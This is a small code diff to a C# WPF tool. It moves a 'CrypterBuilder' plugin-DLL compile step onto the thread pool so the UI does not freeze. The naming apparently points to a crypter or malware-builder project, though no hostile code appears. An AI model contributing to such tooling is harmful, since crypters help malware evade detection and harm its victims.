@@ -2938,7 +2938,9 @@ Read-Host 'Press Enter to close'
             else
                 Log($"[*] AutoTask: Compiling {taskName} plugin...");
 
-            bytes = await Builder.CrypterBuilder.CompilePluginDllAsync(cppSource, extraLibs, Log);
+            // Run on thread pool — GetVsEnvironment() calls WaitForExit() synchronously
+            // which would block the UI thread when awaited back on the WPF SynchronizationContext.
+            bytes = await Task.Run(() => Builder.CrypterBuilder.CompilePluginDllAsync(cppSource, extraLibs, Log));
             if (bytes == null)
             {
                 Log($"[!] AutoTask: {taskName} compile failed — task not added.");
